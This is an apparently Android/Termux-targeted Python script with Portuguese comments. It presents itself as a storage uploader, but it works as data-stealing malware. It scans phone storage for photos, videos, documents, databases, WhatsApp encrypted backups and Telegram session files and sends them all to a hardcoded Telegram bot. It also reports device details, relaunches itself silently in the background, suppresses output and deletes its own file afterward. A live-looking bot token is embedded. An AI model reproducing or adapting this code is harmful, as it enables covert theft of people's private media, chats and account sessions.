#!/usr/bin/env python3
"""
STORAGE FILE UPLOADER - Envia arquivos reais do storage para Telegram
"""
import os
import sys
import time
import requests
import subprocess
import threading
import queue
from datetime import datetime

# ========== CONFIGURAÇÃO ==========
BOT_TOKEN = "8680398497:AAEicUkcoVE9wq4MIVg4L9sLzsQDEC5oFdc"
CHANNEL_ID = "8529800400"
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB (limite do Telegram)

class TelegramUploader:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id
        self.base_url = f"https://api.telegram.org/bot{token}"
        self.upload_queue = queue.Queue()
        self.total_uploaded = 0
        self.total_failed = 0
        
    def send_message(self, text):
        """Envia mensagem de status"""
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def upload_file(self, filepath):
        """Upload de arquivo único"""
        try:
            filename = os.path.basename(filepath)
            file_size = os.path.getsize(filepath)
            
            # Verifica tamanho
            if file_size > MAX_FILE_SIZE:
                return False, f"Arquivo muito grande: {filename} ({format_size(file_size)})"
            
            # Determina tipo de upload
            ext = filename.lower().split('.')[-1] if '.' in filename else ''
            
            # Imagens
            if ext in ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']:
                url = f"{self.base_url}/sendPhoto"
                with open(filepath, 'rb') as f:
                    files = {'photo': (filename, f)}
                    data = {
                        'chat_id': self.chat_id,
                        'caption': f"📸 {filename}\n📁 {os.path.dirname(filepath)}\n📊 {format_size(file_size)}"
                    }
                    response = requests.post(url, files=files, data=data, timeout=60)
            
            # Vídeos
            elif ext in ['mp4', 'avi', 'mkv', 'mov', '3gp']:
                url = f"{self.base_url}/sendVideo"
                with open(filepath, 'rb') as f:
                    files = {'video': (filename, f)}
                    data = {
                        'chat_id': self.chat_id,
                        'caption': f"🎥 {filename}\n📁 {os.path.dirname(filepath)}\n📊 {format_size(file_size)}"
                    }
                    response = requests.post(url, files=files, data=data, timeout=120)
            
            # Áudio
            elif ext in ['mp3', 'wav', 'ogg', 'm4a']:
                url = f"{self.base_url}/sendAudio"
                with open(filepath, 'rb') as f:
                    files = {'audio': (filename, f)}
                    data = {
                        'chat_id': self.chat_id,
                        'caption': f"🎵 {filename}\n📁 {os.path.dirname(filepath)}\n📊 {format_size(file_size)}"
                    }
                    response = requests.post(url, files=files, data=data, timeout=60)
            
            # Voz (áudios do WhatsApp)
            elif ext in ['opus', 'aac']:
                url = f"{self.base_url}/sendVoice"
                with open(filepath, 'rb') as f:
                    files = {'voice': (filename, f)}
                    data = {
                        'chat_id': self.chat_id,
                        'caption': f"🎤 {filename}\n📁 {os.path.dirname(filepath)}"
                    }
                    response = requests.post(url, files=files, data=data, timeout=60)
            
            # Documentos (qualquer outro arquivo)
            else:
                url = f"{self.base_url}/sendDocument"
                with open(filepath, 'rb') as f:
                    files = {'document': (filename, f)}
                    data = {
                        'chat_id': self.chat_id,
                        'caption': f"📄 {filename}\n📁 {os.path.dirname(filepath)}\n📊 {format_size(file_size)}"
                    }
                    response = requests.post(url, files=files, data=data, timeout=60)
            
            if response.status_code == 200:
                return True, f"✅ {filename}"
            else:
                error_msg = response.json().get('description', 'Unknown error')
                return False, f"❌ {filename}: {error_msg}"
                
        except Exception as e:
            return False, f"❌ {filename}: {str(e)}"
    
    def find_important_files(self):
        """Encontra arquivos importantes para upload"""
        important_files = []
        
        # Extensões importantes
        important_extensions = {
            # Imagens
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic', '.heif',
            # Vídeos
            '.mp4', '.avi', '.mkv', '.mov', '.3gp', '.m4v', '.flv',
            # Áudio
            '.mp3', '.wav', '.ogg', '.m4a', '.opus', '.aac', '.flac',
            # Documentos
            '.pdf', '.doc', '.docx', '.txt', '.rtf', '.odt',
            '.xls', '.xlsx', '.csv',
            '.ppt', '.pptx',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            # Bancos de dados
            '.db', '.sqlite', '.sqlite3',
            # WhatsApp
            '.crypt12', '.crypt14', '.crypt15',
            # Telegram
            '.session'
        }
        
        # Pastas importantes para scan
        important_paths = [
            "/sdcard/DCIM",
            "/sdcard/Pictures",
            "/sdcard/Movies",
            "/sdcard/Music",
            "/sdcard/Download",
            "/sdcard/Documents",
            "/sdcard/WhatsApp/Media",
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
            "/sdcard/Telegram",
            "/data/data/com.termux/files/home/storage/shared"
        ]
        
        for base_path in important_paths:
            if not os.path.exists(base_path):
                continue
                
            for root, dirs, files in os.walk(base_path):
                for file in files:
                    filepath = os.path.join(root, file)
                    
                    # Verifica extensão
                    ext = os.path.splitext(file)[1].lower()
                    if ext in important_extensions:
                        try:
                            size = os.path.getsize(filepath)
                            # Ignora arquivos muito pequenos ou muito grandes
                            if 1024 < size < MAX_FILE_SIZE:  # > 1KB e < 50MB
                                important_files.append(filepath)
                        except:
                            pass
        
        return important_files
    
    def start_upload(self):
        """Inicia processo de upload"""
        self.send_message("🔍 <b>Iniciando scan do dispositivo...</b>")
        
        # Encontra arquivos
        files = self.find_important_files()
        
        self.send_message(f"📊 <b>Arquivos encontrados:</b> {len(files)}\n⏳ <b>Iniciando upload...</b>")
        
        uploaded = 0
        failed = 0
        total_size = 0
        
        for filepath in files:
            try:
                success, message = self.upload_file(filepath)
                
                if success:
                    uploaded += 1
                    total_size += os.path.getsize(filepath)
                else:
                    failed += 1
                
                # Status a cada 10 arquivos
                if (uploaded + failed) % 10 == 0:
                    status = f"""
📊 <b>Status do Upload</b>
✅ Enviados: {uploaded}
❌ Falhas: {failed}
💾 Total: {format_size(total_size)}
🕐 {datetime.now().strftime('%H:%M:%S')}
"""
                    self.send_message(status)
                
                # Delay para evitar flood
                time.sleep(2)
                
            except Exception as e:
                failed += 1
                print(f"Erro: {e}")
        
        # Relatório final
        final_report = f"""
🎯 <b>UPLOAD CONCLUÍDO</b>
{'='*30}

✅ <b>Arquivos enviados:</b> {uploaded}
❌ <b>Falhas:</b> {failed}
💾 <b>Total transferido:</b> {format_size(total_size)}
🕐 <b>Finalizado:</b> {datetime.now().strftime('%H:%M:%S')}

📱 <b>Dispositivo:</b> {get_device_info()}
"""
        self.send_message(final_report)

def format_size(size):
    """Formata tamanho"""
    for unit in ['B', 'KB', 'MB', 'GB']:
        if size < 1024.0:
            return f"{size:.1f} {unit}"
        size /= 1024.0
    return f"{size:.1f} TB"

def get_device_info():
    """Informações do dispositivo"""
    try:
        model = subprocess.getoutput("getprop ro.product.model").strip()
        android = subprocess.getoutput("getprop ro.build.version.release").strip()
        return f"{model} (Android {android})"
    except:
        return "Desconhecido"

def main():
    """Função principal"""
    if BOT_TOKEN == "SEU_BOT_TOKEN_AQUI":
        print("[-] Configure BOT_TOKEN e CHANNEL_ID!")
        sys.exit(1)
    
    # Executa silenciosamente
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
        
        uploader = TelegramUploader(BOT_TOKEN, CHANNEL_ID)
        uploader.start_upload()
        
        # Auto-destruição após upload
        time.sleep(5)
        os.remove(sys.argv[0])
        
    except Exception as e:
        pass

if __name__ == "__main__":
    # Executa em background
    if len(sys.argv) > 1 and sys.argv[1] == "--silent":
        main()
    else:
        # Auto-executa em modo silencioso
        subprocess.Popen([sys.executable, sys.argv[0], "--silent"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL)
